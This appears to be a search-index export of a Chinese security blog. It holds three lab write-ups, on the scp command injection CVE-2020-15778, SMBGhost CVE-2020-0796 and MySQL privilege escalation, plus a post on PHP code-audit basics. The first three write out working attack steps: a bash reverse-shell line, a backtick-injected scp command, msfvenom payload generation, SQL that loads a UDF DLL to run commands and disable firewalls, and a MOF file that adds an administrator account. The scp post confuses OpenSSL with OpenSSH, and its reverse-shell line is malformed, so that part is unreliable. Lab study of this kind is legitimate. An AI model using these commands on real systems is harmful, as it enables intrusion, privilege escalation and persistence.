<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2020-15778 OpenSSL漏洞复现</title>
    <url>/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
<blockquote>
<p>OpenSSH &lt;= 8.3p1 </p>
</blockquote>
<p><strong>漏洞介绍</strong></p>
<blockquote>
<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
</blockquote>
<p><strong>局限性</strong></p>
<blockquote>
<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
</blockquote>
<ol>
<li><strong>关闭自带防火墙(firewalld)</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
$ systemctl stop firewalld
</code></pre>
<ol start="2">
<li><strong>设置iptables策略</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">service iptables start
iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
service iptables save
iptables -L -n --line-number 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
<p><strong>验证</strong></p>
<blockquote>
<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
<p><strong>kali监听6666端口</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
<p><strong>命令执行，运行1.sh</strong></p>
<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
<p>scp命令源码</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
    xasprintf(&bp, "%s -t %s%s", cmd,
        *targ == '-' ? "-- " : "", targ);
    if (do_cmd(thost, tuser, tport, bp, &remin,
        &remout) < 0)
        exit(1);
    if (response() < 0)
        exit(1);
    free(bp);
&#125;
</code></pre>
<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
]]></content>
      <tags>
        <tag>OpenSSL</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
<p>SMB远程代码执行漏洞</p>
<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
</blockquote>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server, Version 1903 (Server Core installation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server, Version 1909 (Server Core installation)
</code></pre>
<p><strong>漏洞复现工具下载</strong></p>
<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>将目标机的防火墙关闭</strong></li>
<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
<ol start="3">
<li><strong>利用下载的poc脚本发起攻击</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>生成一个反弹木马</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python

   说明: 
   #-p payload
   #-e 编码方式
   #-i 编码次数
   #-b 过滤坏字符
   #LHOST,LPORT 监听上线的主机IP和端口
   #-f python 生成python格式
   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
<ol start="2">
<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
<ol start="3">
<li><strong>开启msf监听模块</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
<ol start="4">
<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
<blockquote>
<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
</blockquote>
]]></content>
      <tags>
        <tag>复现</tag>
        <tag>Windows 10</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL提权</title>
    <url>/2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
<p>流程：服务探针——信息收集——提权利用——获取权限</p>
</blockquote>
<p><strong>提权前提：</strong>获取数据库最高管理员的账户密码</p>
<ul>
<li>读取网站数据库配置文件（了解其命名规则及查找技巧）</li>
</ul>
<pre><code>sql、data、inc、config、conn、database、common、include
</code></pre>
<ul>
<li>读取数据库存储或备份文件（了解数据库存储格式及对应内容）</li>
</ul>
<pre><code>@@basedir/data/数据库名/表名.MYD    (表内容)
</code></pre>
<ul>
<li>暴力破解（了解数据库是否支持外联及如何开启外联）</li>
</ul>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>利用root权限，创建带有调用cmd函数的<code>udf.dll</code>(动态链接库)。当我们把<code>udf.dll</code>导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用<code>CREAT FUNCITON</code>调用dll中的函数后，MySQL账号转化为system权限，从而来提权。</p>
<blockquote>
<p>MySQL &lt; 5.1    <code>udf.dll</code>文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于<code>c:\winnt\system32</code>。</p>
<p>MySQL =&gt; 5.1    <code>udf.dll</code>文件必须放置于<code>MYSQL安装目录下的lib\plugin</code>文件夹下。</p>
</blockquote>
<p><strong>查看数据库服务版本信息</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select @@version;
select version();
</code></pre>
<p><strong>查看数据库安装目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select @@basedir;
select basedir();
</code></pre>
<p><strong>查看MySQL安装路径</strong></p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%plugins%'; 
</code></pre>
<p><strong>利用<code>NTFS ADS</code>创建<code>lib</code>目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib::$INDEX_ALLOCATION';
</code></pre>
<p><strong>利用<code>NTFS ADS</code>创建<code>plugin</code>目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib\\plugin::$INDEX_ALLOCATION';
</code></pre>
<p><strong>UDF提权文件所在位置</strong></p>
<p>msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。</p>
<blockquote>
<p>metasploit下的动态链接库</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101535951.png" alt="image-20210410101535951"></p>
<blockquote>
<p>sqlmap下的动态链接库</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101703903.png" alt="image-20210410101703903"></p>
<blockquote>
<p>sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的<code>plugin</code>目录下是无法加载的，需要用<code>sqlmap/extra/cloak/cloak.py</code>进行解码</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">python .\cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101854163.png" alt="image-20210410101854163"></p>
<p><strong>导出<code>dll</code>到指定目录</strong></p>
<p>可以使用msf中<code>mysql_udf_payload</code>模块</p>
<blockquote>
<p>条件：</p>
<p><code>secure_auth=YES</code>    (运行导出文件)</p>
<p><code>secure_file_prive=空</code>    (可以导出任意文件到任意位置)</p>
</blockquote>
<p><strong>查看是否允许文件导出导入</strong></p>
<pre class=" language-mysql"><code class="language-mysql">show variables like "%secure%";
</code></pre>
<p><strong>导出<code>dll</code></strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll';
</code></pre>
<p><strong>创建<code>cmdshell</code> 函数</strong> (该函数叫什么名字在后续中则使用该函数进行查询)</p>
<pre class=" language-mysql"><code class="language-mysql">create function cmdshell returns string soname 'udf.dll';

# [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM()
# SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下
</code></pre>
<p><strong>执行命令</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select cmdshell('whoami');
# 关闭windows防火墙和筛选
select cmdshell('net stop policyagent');     
select cmdshell('net stop sharedaccess');
select cmdshell('netsh advfirewall set allprofiles state off');
</code></pre>
<p><strong><code>udf.dll</code>下常见函数</strong></p>
<pre class=" language-shell"><code class="language-shell">cmdshell     //执行cmd;
downloader     //下载者,到网上下载指定文件并保存到指定目录;
open3389     //通用开3389终端服务,可指定端口(不改端口无需重启);
backshell     //反弹Shell;
ProcessView //枚举系统进程;
KillProcess //终止指定进程;
regread     //读注册表;
regwrite     //写注册表;
shut         //关机,注销,重启;
about         //说明与帮助函数;
</code></pre>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做<code>托管对象格式</code>其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<p><strong>MOF提权过程:</strong></p>
<ol>
<li>将MOF上传至任意可读可写目录下</li>
<li>更改MOF文件代码</li>
</ol>
<pre class=" language-shell"><code class="language-shell">#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
&#123; 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
&#125;; 

instance of ActiveScriptEventConsumer as $Consumer 
&#123; 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; 
&#125;; 

instance of __FilterToConsumerBinding 
&#123; 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
&#125;;
</code></pre>
<ol start="3">
<li>使用SQL语句将系统当中默认的<code>nullevt.mof</code>给替换掉</li>
</ol>
<pre class=" language-mysql"><code class="language-mysql">select load_file('D:\wamp\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
</code></pre>
<h3 id="MSF进行MOF提权"><a href="#MSF进行MOF提权" class="headerlink" title="MSF进行MOF提权"></a>MSF进行MOF提权</h3><blockquote>
<p>Msf下的<code>exploit/windows/mysql/mysql_mof</code>模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_mof
set rhost IP //设置需要提权的远程主机IP地址
set rport 3306 //设置mysql的远程端口
set password root //设置mysql数据库root密码
set username root //设置mysql用户名
show options //查看设置
exploit
</code></pre>
<blockquote>
<p>MySQL允许远程root登入</p>
</blockquote>
<pre class=" language-mysql"><code class="language-mysql">一:
use mysql;
update user set host = '%' where user = 'root';
FLUSH PRIVILEGES ;
二:
GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;
FLUSH PRIVILEGES;
</code></pre>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><blockquote>
<p>导出自定义可执行文件到启动目录配合重启执行</p>
<p>将创建好的后门或执行文件进行服务器启动项写入,配合重启执行</p>
</blockquote>
<p><strong>MSF进行启动项提权</strong></p>
<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_start_up
set rhost IP //设置需要提权的远程主机IP地址
set rport 3306 //设置mysql的远程端口
set password root //设置mysql数据库root密码
set username root //设置mysql用户名
show options //查看设置
exploit
</code></pre>
<p><a href="https://xz.aliyun.com/t/2719">Windows下三种MySQL提权剖析</a></p>
<p><a href="https://www.cnblogs.com/yzloo/p/10390916.html">MySQL数据库渗透及漏洞利用总结</a></p>
<p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">mof提权原理及其过程</a></p>
]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计基础概念</title>
    <url>/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul>
<li>Notepad++</li>
<li>Visual Studio Code</li>
</ul>
<h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><ul>
<li>Seay源代码审计系统</li>
<li>Firtufy SCA</li>
<li>RIPS</li>
</ul>
<h4 id="漏洞验证辅助"><a href="#漏洞验证辅助" class="headerlink" title="漏洞验证辅助"></a>漏洞验证辅助</h4><ul>
<li>BurpSuite Community</li>
<li>浏览器扩展</li>
<li>编码转换、加密解密工具 </li>
<li>正则调试工具</li>
<li>SQL执行监控工具</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
<ol>
<li>检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪）</li>
<li>找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪）</li>
<li>直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码</li>
</ol>
<ul>
<li>学好代码审计需要掌握一下几点<ul>
<li>PHP编程语言的特性和基础</li>
<li>Web前端编程基础</li>
<li>漏洞形成原理</li>
<li>代码审计思路</li>
<li>不同系统、中间件之间的特性差异</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p>​                                                            <strong>常见<code>PHP_INI_*</code>常量的定义</strong></p>
<table>
<thead>
<tr>
<th align="center">常量</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>PHP_INI_USER</strong></td>
<td align="center">该配置选项可在用户的PHP脚本或Windows注册表中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_PERDIR</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>、<code>.htaccess</code>或<code>httpd.conf</code>中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_SYSTEM</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>或<code>httpd.conf</code>中配置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_ALL</strong></td>
<td align="center">该配置选项可在任何地方设置</td>
</tr>
<tr>
<td align="center"><strong>php.ini.only</strong></td>
<td align="center">该配置选项可仅可在php.ini中配置</td>
</tr>
</tbody></table>
<h4 id="常见核心配置"><a href="#常见核心配置" class="headerlink" title="常见核心配置"></a><strong>常见核心配置</strong></h4><p><font size='4' color='red'>register_globals(全局变量注册开关)</font></p>
<blockquote>
<p>版本：&lt;= <code>PHP 5.3.0</code></p>
</blockquote>
<p>在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用</p>
<p><font size='4' color='red'>allow_url_include(是否允许包含远程文件)</font></p>
<blockquote>
<p>版本：<code>PHP all</code>    PHP 5.2.0之后默认为Off</p>
<p>类似函数：<code>allow_url_fopen(是否打开远程文件)</code></p>
</blockquote>
<p>在该配置为on的情况下，它可以直接远程包含文件，当存在<code>include($var)</code>并且<code>$var</code>可控的情况下，可以直接控制其来执行PHP代码</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217095516607.png" alt="image-20201217095516607"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217100014708.png" alt="image-20201217100014708"></p>
<p><font size='4' color='red'>magic_quotes_gpc(魔术引号自动过滤)</font></p>
<blockquote>
<p>版本：<code>&lt; PHP 5.4</code>；    <code>PHP 5.3</code>之后不推荐使用该函数</p>
<p>置返回： <code>&lt; PHP 4.2.3</code>配置范围为PHP_INI_ALL；<code>&gt; PHP 4.2.3</code>配置范围为PHP_INI_PERDIR</p>
</blockquote>
<p>当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号<code>&#39;&#39;</code>、双引号<code>&quot;&quot;</code>、反斜杠<code>\</code>以及空字符<code>NULL</code>的前面加上反斜杠</p>
<p>在<code>PHP5</code>中<code>magic_quotes_gpc</code>不会过滤<code>$_SERVER</code>变量，导致很多client-ip、referer一类的漏洞能够利用。</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217102901642.png" alt="image-20201217102901642"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217103333525.png" alt="image-20201217103333525"></p>
<p><font size='4' color='red'>open_basedir(PHP可访问目录)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：<code>&lt; PHP 5.2.3</code>配置范围为PHP_INI_SYSTEM；<code>&gt; PHP 5.2.3</code>配置范围PHP_INI_ALL</p>
</blockquote>
<p><code>open_basedir</code>指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到<code>open_basedir</code>指令中，多个目录用分号(<code>;</code>)分隔</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># `open_basedir`指定的实际上时前缀，而不是目录名</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a        
<span class="token shell-comment comment"># 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a<span class="token operator">/</span>
<span class="token shell-comment comment"># 设置只能访问/www/a文件</span>
</code></pre>
<p>当<code>open_basedir</code>配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率</p>
<p><font size='4' color='red'>disable_functions(禁用函数)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：该指令的配置范围为<code>php.ini only</code></p>
</blockquote>
<p>在正式生产环境中，为了更安全地允许PHP，也可以使用<code>disable_functions</code>指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将<code>dl()</code>函数加到禁止列表中，因为攻击者可以利用<code>dl()</code>函数来加载自定义的PHP扩展以突破<code>disable_functions</code>的限定</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 多个函数之间用逗号（,）分隔</span>
disable_functions<span class="token operator">=</span>phpinfo<span class="token punctuation">,</span>eval<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>dl
</code></pre>
<p><font size='4' color='red'>disable_errors和error_reporting(错误显示)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>配置范围：PHP_INI_ALL</p>
</blockquote>
<p><code>disable_errors</code>表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。</p>
<p>为了避免一些安全隐患，在设置<code>disable_errors=On</code>时，还可以配置<code>error_reporting</code>，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。</p>
<p>​                                                                <strong>数字格式与变量格式的详细信息</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217152415931.png" alt="image-20201217152415931"></p>
<p>​                                                                             <strong>常用指令及说明</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217154018469.png" alt="image-20201217154018469"></p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
